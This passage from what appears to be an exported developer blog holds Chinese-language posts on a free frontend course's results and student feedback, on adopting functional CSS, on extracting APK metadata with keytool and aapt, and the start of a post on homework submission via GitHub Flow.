課程成效講完了課程大綱的設計理念，以及我自己在這堂課最想要傳達的核心思想之後，該來談一下這堂課程的成效了。 前面有說到一共 38 人收到錄取信，到後來只有 36 人填寫基本資料，兩個人就這樣消失了。 而這 36 人之中，只有 26 人有完成第一次作業，意思是說，有 10 個人連作業都沒做，28% 的人就這樣不見了。因此之後的數據我會把參與這次課程的人數調降為 26 人。 能夠撐完十次作業的，只有 8 個人而已，大約是 30%。 下圖是每一次作業完成的人數 可以看到掉得最多的一次是 hw2 -&gt; hw3，寫 CSS 必備神器：CSS 預處理器，我也不知道為什麼這一週會掉這麼多人。 課程結束之後的問卷回饋，作業沒有做完的理由有：時間無法配合、作業難度太高、懶惰、有其他事情、沒興趣。 而問卷中有一題是：「覺得難度最高的作業是哪一個？」，大多數人的回答都是 hw5（讓網頁變得更完整：加上 placeholder 與 infinite scroll）跟 hw6（返璞歸真：vanilla js），因為以前完全沒有寫過類似的東西。 如果以後要改善的話，可以把 hw5 再細切成幾個單元，而不是一次就完成這兩項，hw6 也可以用類似的方法，這樣對學生來說應該就不會一下子難度跳這麼多，而是慢慢變難。 學員回饋課程結束之後有請大家填了一下回饋的表單，很幸運地，大家感想都滿多的。我原本想要把原文全部貼上來，但這樣篇幅會太多，有點妨礙閱讀，因此我只擷取部份，刪除掉一些重複的內容。 老師在講解或改作業時有什麼優點？（以下皆為回饋原文，我只修了一些排版而已） 講解的部分使用 Youtube 直播可以方便學生彈性安排時間聽課。講解的內容有個很大的優點就是 Huli 會用非常淺顯易懂的例子與概念切入，讓自己有時候花了一兩天寫的作業，聽完講解後覺得「哇靠原來這麼沒有想像那麼難」，而每一堂講解的編排有組織性，也很容易整理筆記。改作業的部分，Huli 會仔細看我有列出的 troubleshooting 並提供有用的建議，也會在做的不錯時給予滿滿的鼓勵，這對新手入門算是很棒的引導。 講解的時候講到很多我原本準備好要問的東西，而且講解方式很容易讓人理解，因為有交代原因，所以也很容易讓人接受。就像安排課程一樣，每個章節循序漸進，就會很容易理解以及接受為什麼要用這些東西，以及這些東西的好用之處。 雖然我只有交前面幾次作業，不過可以看得出來有用心在看作業。講解方面，我覺得非常好不會突然出現尷尬的時候，也講得很清楚！ 直播完整程式 live coding 過程，包括用terminal執行指令，讓我這個 terminal 生手不再害怕使用 terminal，也對它越來越熟悉了，是這次程式課後的額外驚喜收穫。講解程式會讓人覺得原來寫程式可以這麼清晰簡單，講解過程看似輕鬆卻有架構。當同學聽不懂時會用很多不同角度切入解釋，像是生活化例子或是各種相關連結以加深同學對程式的觀念和印象！ 老師在講解或改作業時有什麼缺點？ 感覺上沒什麼缺點，如果要說可以更好的地方的話，感覺上 IDE color theme 可以用字與背景對比強一點的，觀賞上能增進使用者體驗。不過整體而言不成大礙。 可以的話，可以準備個 txt 檔案把當天要說的重點寫上去順便當標題XD 當課程內容如 webpack 和 gulp 是我完全陌生的東西，也沒碰過 node.js 下，聽起來就會覺得講解速度較快，尤其直播課時會說這 webpack 和 gulp 作業算很容易，就會讓初學 node.js 的我有些感到挫折…希望自己能培養對新事物有更快速上手的能力。 這倒不算是缺點，只是小建議。如果要在直播時節省時間，可以先在直播前把可能需要用到的網站先放在瀏覽器。不過直接在直播時搜尋的好處是，我們事後要搜尋可以知道你利用什麼關鍵字去搜尋。 課程心得回饋問卷裡的心得礙於篇幅，貼在這邊不太適合，因此我只貼兩篇寫在自己 Blog 的。 Frontend Intermediate Course - 學習心得 心得｜Huli’s Frontend Intermediate Course｜緣起與收穫 自我檢討先來說缺點的部分，其實比起優點，我更想聽到的是缺點。因為知道缺點在哪邊才能持續改進嘛，但不知道是這次表現太好還是學生不好意思，缺點的部分回饋的比較少。 身為一個不斷追求進步的老師，就算學生沒講，自己也應該要察覺到一些缺點。 1.改作業有時候馬馬虎虎。雖然學生說改作業很用心，但其實有時候我一次面對堆積如山的十幾個作業，很多東西都只是快速看過去而已，畢竟老師也是會懶惰的…這是我之後可以再改進的地方 2.課程規劃不夠「痛」上面我有提到要先痛過才能理解，我覺得作業還可以再切得更細，讓學生更「痛」一點。例如說培養 coding style 的部分，可以先出一個作業規定大家：「變數名稱只能用一個英文單字，例如說 a, e, y 等等，不夠用的話加上數字變成 a0 等等」，做完一次作業之後，隔週再讓大家看自己上週寫的程式，應該會發現看不懂在幹嘛。 這個時候，他們就會知道變數命名的重要性了。 接著談談優點，開頭有提到說這是一場：「三十人的教學實驗」，實驗目標就是驗證我上面講的那些教學理念（要先痛過、要懂目的、要知道為什麼）是否真的能幫助學生學習。 從學生反饋的結果看來，我認為是可以的，這也更加確認了我以後課程的規劃方向。 有關優點的部分，我就直接貼幾個學生的回饋上來吧！從這些回饋裡面就可以發現，我想傳達的，他們都能夠確實接收到。 講解的時候講到很多我原本準備好要問的東西，而且講解方式很容易讓人理解，因為有交代原因，所以也很容易讓人接受。就像安排課程一樣，每個章節循序漸進，就會很容易理解以及接受為什麼要用這些東西，以及這些東西的好用之處。 講解程式會讓人覺得原來寫程式可以這麼清晰簡單，講解過程看似輕鬆卻有架構。當同學聽不懂時會用很多不同角度切入解釋，像是生活化例子或是各種相關連結以加深同學對程式的觀念和印象！ 很喜歡老師的教學是讓同學先寫再公布答案，讓同學有機會先嘗試各種自己先想的到或找的到的可能解法，而等到直播課時才公布老師的做法，可以有互相交流切磋的機會，也不會讓同學是腦袋空空去上課。因為都先寫好作業了，在課堂上也更易吸收和整合，也能馬上快速理解哪種情境適合哪種解法，也能一眼發現自己先前卡住的地方在哪，因為都已經卡過了。 在這次程式課也發現寫程式這件事的思考沒有想像中的複雜，可能和老師的教學大綱切的清楚乾淨，以及講解時是以「需求」為出發點。一些新手，像是我，常常在開發過程花了一堆時間，總是在寫連自己也不太懂自己幹嘛或為何而寫的code。寫code時的思考是我在這堂程式課學到的珍貴收穫。 總結先感謝我的學生們，陪我走過了十週的課程，並且願意在結束之後給予回饋。 我一直覺得，程式教學應該要能有更好的方法，能夠幫助學生更快上手、更快理解。這次的課程讓我驗證了我目前的方向是對的，之後也會一直朝著這方向前進。 如果你對這次課程感興趣，可以前往課程的 Github 頁面觀看課程內容，或是到Youtube直接觀看影片。 也可以直接到我最近才開的線上課程平台：Lidemy 鋰學院註冊課程，完全免費！我把作業內容跟影片都上傳到上面了。（但因為課程已經結束了，所以沒有人會幫你改作業） 我認為這堂課的價值在於「先寫作業，後講解」的教學模式，因此像上面這樣把教學影片公佈出來，我不打算盈利，都是完全免費的資源，開放大家隨意取用，因為這堂課的核心價值已經不見了，所以也沒必要收費。 我希望我的課程在各個環節上都能夠公開透明，因此，若是對學員課後提交的回饋表單有興趣，這邊有學員回饋的完整備份（只有刪除掉一些個人資料）。 最後，感謝大家願意花時間閱讀這篇落落長的文章，若是對我後續的教學實驗或課程有興趣，麻煩請追蹤Lidemy 鋰學院粉絲專頁，後續的消息都會公布在那邊。 感謝。","link":"/2017/06/03/frontend-tutorial-experiment/"},{"title":"邪魔歪道還是苦口良藥？Functional CSS 經驗分享","text":"前言以 CSS 架構方法來說，主流的大概可以分成三個：OOCSS、SMACSS、BEM，這些架構的提出都是為了讓 CSS 更好維護，這幾個的介紹以及差異可以參考 @arvinh 寫過的 淺談 CSS 方法論與 Atomic CSS。 但我們今天要談的不是上面提到的這三種，而是另外一種相較之下沒那麼主流（但好像有慢慢流行的趨勢），而且很少人第一眼看到就會贊同的方法：functional CSS。 什麼是 functional CSS直接舉一個例子最快： // 一般的寫法 &lt;div class=\"hello\">Hello&lt;/div> .hello &#123; font-weight: 700; color: red; padding: 1rem; &#125; // Functional CSS &lt;div class=\"fw7 red pa3\">Hello&lt;/div> .fw7 &#123; font-weight: 700; &#125; .red &#123; color: red; &#125; .pa3 &#123; padding: 1rem; &#125; 就好像 functional programming 那樣，每個函式都沒有副作用而且可以互相組合，在 functional CSS 裡面每一個 class name 都只負責一個部分（不一定是一個屬性），就像我上面舉的那個範例，它會產生一個字是粗體、紅色並且有 padding 的 div。 順帶一提，如果你有用過 Bootstrap4 的話，你很有可能已經體驗過 functional CSS 了，裡面就出現了一大堆這種類型的 class name 。 你喜歡這種風格的寫法嗎？ 如果你是第一次看到這種寫法，我覺得你心裡想的應該是：「這是三小，好噁心」、「這不就是 inline style 嗎」、「這根本不是 CSS 吧！」 沒關係，我第一眼看到也是這樣覺得的，但會寫這篇文章就是因為我後來改觀了，於是接下來我要談談我與 functional CSS 從互相厭惡到和解的過程。 我與 functional CSS 的愛恨糾葛一開始看到 functional CSS 覺得很特別但也很奇怪，老實說連想試的感覺都沒有，只覺得這樣寫 CSS 也太奇怪了吧，根本就是邪魔歪道！而且 class name 一點可讀性都沒有。 但有天我在 hacker news 上面讀到了這篇文章：In defense of Functional CSS，徹底改變了我對它的想法。 這篇文章針對幾個常見的批評給予了反駁，我下面舉幾個文章裡面提的例子： 跟 inline style 差在哪？ Inline style 不能有 media query inline style 的屬性可以隨意設置（這之後我會講詳細一點） Inline style 沒辦法處理 :before, :after Inline style 無法重用，但是 css class 可以，我可以定義一個叫做 .bg-red 的規則，想要背景是紅色的加上去就行了 Inline style 跟 functional css 的可讀性還是有差，比比看 class=&quot;f-sm bg-blue&quot; 跟 style=&quot;font-size: 10px; background-color: #0000ff;&quot; 我覺得作者的幾個反駁都滿合理的，inline style 跟 functional CSS 的確是有差，我想讀到這裡大家應該可以認同如果這兩個一定要選一個，選後者是合理許多的，因為可重用而且可讀性較高。 但大多數人反對 functional CSS 的主要理由還有一個，那就是會把 html 弄的很髒而且不知道在幹嘛。 例如說原文中提到的範例： &lt;div class=\"profile-card\"> ... &lt;/div> &lt;style> .profile-card &#123; padding: 20px; margin: 20px; color: #eee; background: #333; border: 1px solid #555; &#125; &lt;/style> &lt;div class=\"m-5 p-5 text-gray-light bg-gray-darker border border-gray-light\"> ... &lt;/div> 前者你一看就知道是一個 profile card，但後者你光看 html 根本看不出來他是什麼。 在這邊作者給的解釋我覺得也很不錯： 你可以一起用啊 對欸，你可以變成這樣： &lt;div class=\"profile-card m-5 p-5 text-gray-light bg-gray-darker border border-gray-light\"> ... &lt;/div> 這樣你可以維持原有的 class name 命名方式，而這個命名只是為了方便讓你辨識出這個元素是什麼，實際上在做 styling 的還是後面的那些 functional class name。 如果還想再反駁，大概就是 html 看起來還是很髒而且一大堆 class name。我覺得這是優點也是缺點，端看你怎麼去看它。 若是你完全不知道那些 class name 是什麼意思，你當然會覺得那是一堆垃圾；但如果你知道是什麼意思，你會發現光是看 HTML，你就可以知道樣式長怎樣，你不必在 HTML 與 CSS 之間切換，而是只要專注在 HTML 就好，因為它的樣式都寫在 class name 裡面了。 舉例來說，你原本的開發流程可能是這樣： 建立一個 profile-card 的html 加上 .profile-card class name 開一個 profile-card.css 開始寫樣式 新增 profile-card-avatar 的 html 加上 .profile-card-avatar 的 html 開始幫這個 class name 寫樣式 但採用 functional CSS 之後，開發流程變這樣： 建立一個 profile-card 的html 幫 profile-card 加上 class name 新增 profile-card-avatar 的html 幫 profile-card-avatar 加上 class name 不用再在 HTML 與 CSS 間切換，因為沒有 CSS 檔案讓你切換。 可是重用性太低了吧，我要幫每個 button 都寫 20 個 class？這個批評基本上是說，假設我有一個 button 用 functional css 之後長這樣：&lt;div class=&quot;bg-blue fw5 pa1&quot;&gt;Click me&lt;/div&gt; 那如果我有其他地方要用這個 button，我不就要複製這一串？如果我 button 的樣式換了，那我不就所有地方都要改？這個重用性也太差了吧。 原文中給的反駁是如果真的有這種情況發生，你應該優先考慮的是把這段 HTML 抽成可重用的 template 之類的，而不是把這個問題怪到 class 身上。 或者我這樣說好了，應該把這個東西變成一個 component，這樣問題就迎刃而解了，因為你只要改 component 就好，不用每個地方都改。 以上就是這篇文章大概的內容，有興趣的可以去看原文，原文寫的比我摘要得清楚滿多的而且講了更多。但總之我看完這篇文章之後有了些想法，並且開始認識到 functional CSS 的好處到底在哪。 Functional CSS 到底好在哪？第一個好處就是你從此（幾乎）不必再寫 CSS！而且你也不用再猶豫 class name 到底要取什麼了！ 這簡直拯救了一堆有命名恐懼症的開發者。用了 functional CSS 以後只要幫 html 加上相對應的 class 就好，就如同我上面舉的範例那樣。 這時候你可能會說：「那我要怎麼知道這段 HTML 到底是幹嘛的？」 第一種解法上面有提過，就是把原本的 class 也加回去，所以有意義的 class name 當作辨識用途，functional css 當作樣式來使用，但這個方法我個人覺得有點多此一舉就是了，而且還要再花時間想要命名什麼 class。 第二種解法是 component，我後來意識到有些 functional CSS 會碰到的問題可以靠 component 來解，這個 component 可以是 web-component 也可以是 React 或是 Vue 裡面的那種 component。 當我們有了 component 以後，就沒有那麼需要 class name 了，因為你看 component 的名稱就知道它是個按鈕，從元件的命名就可以知道，不必再從 class name。況且就算原本有 class name，你還是要先去對照畫面才能確定你到底要改哪裡，畢竟有些 class name 命名的超級模糊，這我相信大家一定都有體會過。 原本在寫 CSS 時你需要考慮的很多東西，到了 functional CSS 幾乎都不存在，你要做的只有幫 HTML 加上 functional CSS 的 class name 幫它裝飾而已。 第二個好處是你一但採用 functional CSS，就可以立刻幫你的 project 產生出一套規範，有點像是 design guideline 那樣。 這是什麼意思呢？ 首先，大家可能會對 functional CSS 有個錯誤認知，那就是覺得它說穿了還是另外一種形式的 inline style，只是多此一舉寫成 class 而已。 不是的，它並不是你想用什麼就用什麼，而是先把規範訂好，你再從可以用的 class 裡面去挑你要用的出來。例如你們產品的網站的背景有兩種主色分別是紅色與藍色，於是你寫了 .bg-red 跟 .bg-blue 這兩個 class。 今天有一個新人來你們公司，他想用紅色就會直接用 bg-red 而不是自己再寫一個 class。如果他真的再寫一個，那 code review 時也可以輕易抓到，因為用了 functional css 的專案通常 CSS 檔案寫好後就不會再變動了，所以有更動的時候特別明顯。 如果今天是按照以前寫 CSS 的方式，有可能他在 CSS 裡面就偷懶直接寫色碼而不是用你在 color.scss 定義好的變數，或也有可能他在 color.scss 裡面眼殘沒看到 bg-red，所以自己加個 bg_red 的 class。 是的，這一樣在 code review 的時候可以抓到，但我想表達的是前者耗費的心力會比後者少，因為要檢查的地方比較少。 一但 functional CSS 的主要 style.css 完成後，這份檔案同時也代表網站的規範，可以使用的顏色、padding、margin、字體、字體大小都在裡面了，想用的時候只能從這裡面找，不能自己隨意新增，所以你可以很輕鬆就規定網站的 padding 只能是 4、8 或是 16，或是行距只能有 1、1.25 跟 1.5。 其實以前用 SCSS 或任何 CSS 預處理器時也可以這樣做，把所有規範都訂成變數，並且規定所有規則都只能用這些變數。但我認為 functional CSS 天生就蘊含著規範在裡面。 第三個好處是檔案大小驟減，因為 padding: 4px 只會在 CSS 檔案裡面出現唯一一次，color: red 也只會出現唯一一次，以 functional CSS 的 framework Tachyons 來說，minified 跟 gzipped 過後的 CSS 大小是 14kb。 現在是 14kb，以後也會是 14kb，因為你所有需要的規則都在裡面了，你的 CSS 大小不會再隨著網站的複雜度增加，這也是很棒的一點。 另外一個 functional CSS framework Tailwind 的作者寫了一篇很棒的文章來探討一些優缺點，並且有脈絡地帶你看 functional CSS 的優勢在哪，我自認絕對不可能寫的比那篇好，所以有興趣再深入理解的可以參考：CSS Utility Classes and “Separation of Concerns”。 總之呢，在爬了一大堆文章以及跟同事討論過以後，我們決定把公司的產品換成 functional CSS，會想換的原因有兩個： CSS 越來越多以後很難維護，只要不小心一個偷懶就成了未來的技術債 CSS 檔案越來越大，但其實可以小很多 Function CSS 實戰經驗分享之前看過一篇 Full re-write in 10 days with tachyons and functional CSS: A case study，作者講述他如何輕鬆寫意的在十天裡面把整個網站改寫完成。 而我們那時除了要重構這些 CSS 以外還要修 bug 跟開發新的功能，所以前前後後大概一個月才把整個網站換完，而且實際下去重構才發現以前寫的有些 CSS 真的是超難維護，因此在這部分也多花了點時間。 上面有提到幾個相關的 CSS framework，但我認為 functional CSS 的概念簡單好懂，自己從頭實作一個反而比較符合自己的需求，於是就參考 Tachyons 的 class name 來實作。 第一步大概是先把一些常用的 class 定出來，例如說顏色： .c-red &#123; color: $color-red; &#125; .c-yellow &#123; color: $color-yellow; &#125; .c-white &#123; color: white; &#125; .c-green &#123; color: $color-green; &#125; .c-grey-83 &#123; color: $color-grey-83; &#125; .c-grey-4a &#123; color: $color-grey-4a; &#125; .c-grey-bb &#123; color: $color-grey-bb; &#125; .c-grey-f8 &#123; color: $color-grey-f8; &#125; 還有必備的 flex 排版： .flex &#123; display: flex; &#125; .inline-flex &#123; display: inline-flex; &#125; .flex-auto &#123; flex: 1 1 auto; &#125; .flex-column &#123; flex-direction: column; &#125; .flex-row &#123; flex-direction: row; &#125; .flex-wrap &#123; flex-wrap: wrap; &#125; .flex-nowrap &#123; flex-wrap: nowrap; &#125; .items-start &#123; align-items: flex-start; &#125; .items-end &#123; align-items: flex-end; &#125; .items-center &#123; align-items: center; &#125; .items-baseline &#123; align-items: baseline; &#125; .items-stretch &#123; align-items: stretch; &#125; .justify-start &#123; justify-content: flex-start; &#125; .justify-end &#123; justify-content: flex-end; &#125; .justify-center &#123; justify-content: center; &#125; .justify-between &#123; justify-content: space-between; &#125; .justify-around &#123; justify-content: space-around; &#125; 除此之外，也可以自己寫一些 utility class： .ellipsis &#123; overflow: hidden; text-overflow: ellipsis; &#125; .limit-line &#123; overflow: hidden; text-overflow: ellipsis; display: block; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; &#125; .pointer:hover &#123; cursor: pointer; &#125; 這就呼應我前面提到的，一個 class name 其實可以有一個以上的規則，只要你能從 class 的名稱清楚知道它在做什麼就好。 重構時的流程其實很固定，基本上就是這幾步： 選定要重構的 component 先從最裡層開始，右鍵檢查，確定這個 class name 沒有其他副作用 把原本的 style 換成 functional CSS 把原本的 class name 移除 在此過程中可以順便把網站的樣式做個規範，例如說原本 padding 是 5 的地方統一變成 4 等等，網站就會變得越來越規範。 不過重構時當然也碰到一些困難，那就是有些以前寫的 CSS 為了圖方便沒有考慮到維護性的問題，到頭來這個坑還是落到自己身上。舉例來說，有個元件叫做 Card，需求是在首頁以及在餐廳頁面它的 padding 不一樣，所以以前就這樣寫： // home_page.scss .home-page &#123; .card &#123; padding: 10px &#125; &#125; // restaurant_page.scss .restaurant-page &#123; .card &#123; padding: 15px; &#125; &#125; // card.scss .card &#123; padding: 20px; &#125; 問題是什麼？問題是如果你只看 .card 的 CSS，你根本不會發現它在不同的頁面下會有不同的 padding！如果只是 padding 的話問題還小，但如果依照這個邏輯繼續往下寫，有可能連顏色跟 margin 都變了，像是： .home-page &#123; .card &#123; padding: 10px &amp;__title &#123; margin-top: 20px; background: red; &#125; &#125; &#125; 這種做法是把顯示的邏輯放在 CSS 裡面，利用 CSS 去操控，所以 JS 裡面不用額外寫任何東西，Card 這個 component 在不同地方就會有不同的樣式。 但我後來覺得這樣不是種好作法，應該要把邏輯移回 JS 裡面比較好，所以改成這樣寫： // home page &lt;Card type=\"home\" /> // restaurant page &lt;Card type=\"restaurant\" /> // Card component function Card(&#123; type &#125;) => ( &lt;div className=&#123;cx(&#123; 'padding-20': !type, 'padding-10': type === 'home', 'padding-15': type === 'restaurant' &#125;)&#125; /> ) 在不同地方我用 component 的 props 來區分，並且把這段邏輯放在 component 裡面，比起 CSS 的做法當然有好有壞，但至少可以保證當我 render 單純的 &lt;Card /&gt; 的時候，在任何一個頁面它的樣式都會是一致的，不用擔心在不同地方會突然出現不同的樣式。 在重構的過程中其實發現很多這種問題，如果沒有趁早除掉的話 CSS 只會越來越多而且越來越亂，到最後會變得超級難維護，會很容易發生改一個 class 壞兩個地方，牽一髮動全身的現象。因此剛好趁著改寫成 functional CSS 的時候來處理這些問題。 許多人對 functional CSS 還有一個誤解，那就是不能寫「其他的」 CSS。舉例來說，我前面提到 functinoal CSS 自成一個規範，沒有寫成 class 的東西你不能用，但其實有些特殊情況還是可以的。 例如說你今天有一個 div 的高是 333px，難道你就要寫一個 .height-333 的 class 嗎？如果真是這樣的話那真的跟 inline style 沒兩樣了。 但 functional CSS 考量的點應該是「能否重用」，能夠重複使用的才把它寫成 class name，像是高 333px 這種我就會直接用 styled-component 或甚至直接寫 inline style，不會特地給它一個 .height-333 的 class，因為整個 App 可能就只有它用得到。 最後讓我們來看一下改寫的成果，這是改寫前，CSS 大約 400kb（gzipped 前）： 這是改寫後，可以看到各項數據都下降很多，CSS 大約 130kb，其實還可以再小，會比較大是因為裡面有一些轉成 base64 的小圖： 改寫之後減少了將近 70% 的 CSS 體積。 而且重點是無論以後 App 大了十倍還是一百倍，CSS 都能夠維持在差不多的大小，因為常用的屬性都被我們變成 class name 了。 改寫的難易度取決於你原本 CSS 的品質，像我們很多 CSS 為了求快沒有多思考耦合就很高，常常要參考兩三個 CSS 檔案才能拼湊出最後 style 的長相。但如果原本就有處理好這個問題，速度應該能夠快滿多的。但整體來說改寫還是算是容易，而且每次改寫完成就感很大，可以直接把一大堆 CSS 規則刪掉，滿有快感的。 有興趣的朋友可以用這個網站對自己的產品做測試：https://cssstats.com/。 總結如果要說 functional CSS 有什麼缺點的話，我目前想到的就是剛開始學習需要一段時間以及 style 多的話 HTML 會變得充滿一堆 class name，比較難閱讀而且檔案也較大，但相較之下我依然認為優點是多過缺點的。 優點前面也大概都說過，基本上就是不用擔心 CSS 的耦合性問題，絕對不會發生改一個 class name 壞兩個 component 的情況，因為每個 class name 都不會互相干擾，也可以保證你把這個 component 搬到任何地方都還是長得一樣，背後不會有特別的 CSS 在那邊搞你。 也不用再煩惱 class name 要怎麼命名了因為你不需要，這個就可以節省滿多時間的。也不用再手寫 CSS 了，所以開發速度也變快了，因為不用再在 CSS 檔案與 component 之間切換，你邊寫 HTML 的時候就可以順手把 style 寫完，存檔以後看個畫面再調整一下就行了，跟以前相比步驟少了很多。 其實對 CSS 我的經驗不是那麼多，可能有很多 case 沒有考慮到或是優缺點沒有講得很清楚，如果對 functional CSS 想要更深入研究的，我文末附的資料都很有參考價值，大家可以看看。 但總之，我現在是 functional CSS 的支持者之一了。 參考資料： In defense of Functional CSS Tachyons Full re-write in 10 days with tachyons and functional CSS: A case study Tailwind: style your site without writing any CSS! CSS Utility Classes and “Separation of Concerns” HN 上面的討論","link":"/2019/01/27/functional-css/"},{"title":"快速取得 apk 相關資訊","text":"（原文發表於：http://blog.techbridge.cc/2016/05/20/fast-way-to-get-apk-information/） 前言在 之前，我們曾經介紹過如何反編譯 Android Apk。而藉由反編譯，我們可以知道許多跟 apk 有關的資訊，例如說 AndroidManifest.xml，只要這個檔案就可以看出 apk 的一些基本資訊，還可以看到整個 apk 的程式碼跟使用到的資源（圖檔、影片、聲音等等）。 但若是今天我們只想要知道基本資訊，完全不想知道 apk 是怎麼寫的，也根本不關心它用到哪些資源，那該怎麼辦呢？反編譯需要一點時間，愈大的 apk 需要愈久，有沒有更好的方法呢？ 需要哪些資訊？首先我們先來定義一下「基本資訊」指的是哪些。以我來說，我想取得的基本資訊有以下六點： package name version code version name launch activity Google SHA1 Fingerprint Facebook Keyhash 前四個的用途在於，假設你今天做了一個公司內部的 apk 上架系統，如果有了前四項資訊，就可以做跟 Google Play 相似的驗證，例如說驗證 package name 跟上次上傳的是否一樣、版本號是否比上一次的高等等。 至於後兩個呢？有串接過 Google 跟 Facebook 登入的讀者就會知道，這兩個是串登入時必備的東西。你要在設定裡面新增這兩組 key，才能夠使用登入功能，否則會出現驗證錯誤之類的字眼。 知道我們需要哪些以後，就來動手做吧！ 好用的 keytoolkeytool 是系統內建，與認證相關的指令。我們可以用 keytool -list -printcert -jarfile NAME.apk 提取出一些資訊： 簽署者 #1: 簽章: 擁有者: CN&#x3D;Android Debug, O&#x3D;Android, C&#x3D;US 發出者: CN&#x3D;Android Debug, O&#x3D;Android, C&#x3D;US 序號: 4b52355e 有效期自: Sun Jan 17 05:53:34 CST 2010 到: Mon Jan 17 05:53:34 CST 2011 憑證指紋: MD5: 14:99:01:12:7A:69:CD:75:4F:31:75:8C:59:F6:71:63 SHA1: 24:69:FD:17:6B:C3:43:FC:3A:85:EC:4B:C5:D7:9F:09:4A:71:60:80 SHA256: 57:EB:73:81:D7:08:E6:45:FE:26:99:FB:3C:1F:37:1E:EE:38:39:20:E0:2D:C6:76:0E:84:2B:DD:1C:5C:C9:70 簽章演算法名稱: SHA1withRSA 版本: 3 以這個 apk 來說，列出了：擁有者、發出者、有效期限、憑證指紋等等的資訊，而其中的 SHA1 就是 Google 登入會用到的資訊。 那 Facebook Keyhash 呢？從 官方文件 可以知道，其實就只是把 sha1 先變成 binary 然後再做 base64 而已。 只要有了 sha1，搭配一些指令，就可以很簡單的生成 Facebook Keyhash。 萬能的 aaptaapt 的全名是：Android Asset Packaging Tool，超級好用！可以先來看看 aapt 到底可以做哪些事情由於我們需要的是取出資訊，因此直接看 dump 的部份： aapt d[ump] [--values] WHAT file.&#123;apk&#125; [asset [asset ...]] badging Print the label and icon for the app declared in APK. permissions Print the permissions from the APK. resources Print the resource table from the APK. configurations Print the configurations in the APK. xmltree Print the compiled xmls in the given assets. xmlstrings Print the strings of the given compiled xml assets. 有興趣的讀者可以每一個都試試看，看會出現什麼結果。以我們的需求來講，badging 是最符合的 aapt dump badging NAME.apk package: name&#x3D;&#39;com.gmail.aszx87410.movie_to_nine&#39; versionCode&#x3D;&#39;1&#39; versionName&#x3D;&#39;1.0&#39; sdkVersion:&#39;8&#39; targetSdkVersion:&#39;16&#39; uses-permission:&#39;android.permission.INTERNET&#39; uses-gl-es:&#39;0x20000&#39; uses-feature-not-required:&#39;android.hardware.telephony&#39; uses-feature:&#39;android.hardware.screen.portrait&#39; uses-feature-not-required:&#39;android.hardware.screen.landscape&#39; application-label:&#39;今晚九點電影2.0&#39; application-label-he:&#39;今晚九點電影2.0&#39; application-label-es:&#39;今晚九點電影2.0&#39; application-label-iw:&#39;今晚九點電影2.0&#39; application-icon-120:&#39;res&#x2F;drawable-ldpi&#x2F;icon.png&#39; application-icon-160:&#39;res&#x2F;drawable-mdpi&#x2F;icon.png&#39; application-icon-240:&#39;res&#x2F;drawable-hdpi&#x2F;icon.png&#39; application-icon-320:&#39;res&#x2F;drawable-xhdpi&#x2F;icon.png&#39; application-icon-480:&#39;res&#x2F;drawable-xxhdpi&#x2F;icon.png&#39; application: label&#x3D;&#39;今晚九點電影2.0&#39; icon&#x3D;&#39;res&#x2F;drawable-mdpi&#x2F;icon.png&#39; launchable-activity: name&#x3D;&#39;com.ansca.corona.CoronaActivity&#39; label&#x3D;&#39;今晚九點電影2.0&#39; icon&#x3D;&#39;&#39; uses-feature:&#39;android.hardware.touchscreen&#39; uses-implied-feature:&#39;android.hardware.touchscreen&#39;,&#39;assumed you require a touch screen unless explicitly made optional&#39; main other-activities other-receivers other-services supports-screens: &#39;small&#39; &#39;normal&#39; &#39;large&#39; &#39;xlarge&#39; supports-any-density: &#39;true&#39; locales: &#39;--_--&#39; &#39;he&#39; &#39;es&#39; &#39;iw&#39; densities: &#39;120&#39; &#39;160&#39; &#39;240&#39; &#39;320&#39; &#39;480&#39; native-code: &#39;&#39; &#39;armeabi-v7a&#39; 將將將將～我們所需要的資訊全部出現在這裡了，還附帶權限列表、app logo、app 名稱等等的資訊做到這邊，全部需要的東西都有了，剩下就只是切出字串與整合而已 總結今天這篇文章簡單介紹了 keytool 跟 aapt 的使用，主要是想要不靠 apktool，利用其他工具取出我們想要的資訊，既省時又省力。 如果你有興趣知道最後做出來的成品長怎樣，apkinfo.sh 是我放在 github 上面的一個小專案，用途就跟這篇文章所教的一樣，就是取出 apk 的相關資訊。","link":"/2016/09/29/fast-way-to-get-apk-information/"},{"title":"利用 Github Classroom 加 Travis CI 打造改作業系統","text":"前言這陣子開始了一個自己的 side project，叫做程式導師實驗計畫，希望能在四個月內把學生培養成找得到工作的工程師。 而 Git 身為工程師的必備技能之一，用 Git 來交作業也是合情合理的一件事，可以先培養學生們對 Git 的熟悉程度。 但問題來了：要怎麼用 Git 交作業？ 之前有開過另外一個前端的課程，那時候我採取的方式是讓學生自己開一個 Github repo 寫作業，並且設置 Github page，所以我可以看到學生的 source code 跟網頁顯示出來的結果。 接著自己設定好 Issue template，要學生寫完作業之後開 issue 提交，如下圖所示： 這樣的好處是我可以把作業都集中在同一個地方管理，可以很方便看出誰交了哪些作業，以及每個作業的狀況： 但缺點也很明顯，那就是身為老師，其實很難「改作業」，意思就是如果我要指正學生們哪邊寫錯了，我只能在 issue 裡面留言，複製它本來的程式碼，然後告訴他怎麼改應該會比較好： 整體來說，其實改作業的體驗還算不錯，沒什麼太大的問題。只是這次既然開始了一個全新的課程，就在想說有沒有更好的方法可以優化這個流程。 新的交作業流程我在設計課程的時候，都會先思考我在工作上運用了哪些東西，並且把我覺得好的、可以移植的制度搬到課程上，背後的目的是希望先讓學生理解這些東西，日後進入職場時可以無縫接軌。 但有時候我不會跟他們講這是你以後工作時可能會碰到的流程，期待他們真的碰到時驚呼：「哇，原來我在課程裡面做過的練習其實是工作上會用到的東西！」 舉例來說，因為這次新的課程是要求學生每天參與，在我沒有上課的時間自學，剛好公司有在跑 Scrum，每天早上都要開 Stand-up meeting，並且在開始前先在 slack 裡面送出簡短的 note，我就把這個制度引入到課程之中。 *昨天* - 完成 git 安裝 - 解 codewar 題目：Opposite number *今天* - 解 codewar 題目：Opposite number - 寫作業：好多星星 每天我都會要求學生在 slack 群組裡面 po 昨天跟今天做的事情，雖然跟實際的 Stand-up meeting 還是相差許多，但至少初衷是一樣的：「幫自己整理進度、讓大家了解你的進度」。 秉持著相同的理念，這次的交作業機制我決定採用 Github Flow。 什麼是 Github Flow？可以先看一下我在官網上面截的圖： 簡單來說就是如果你要做任何改變的話，你要 follow 以下原則： 開新的 Branch 送 Pull Request 等 Review 確定沒問題，merge 到 master 我們公司也是採用類似的工作流程，因此我自己本身對這個流程滿熟悉的。而這個流程的好處是什麼？就是在送 PR 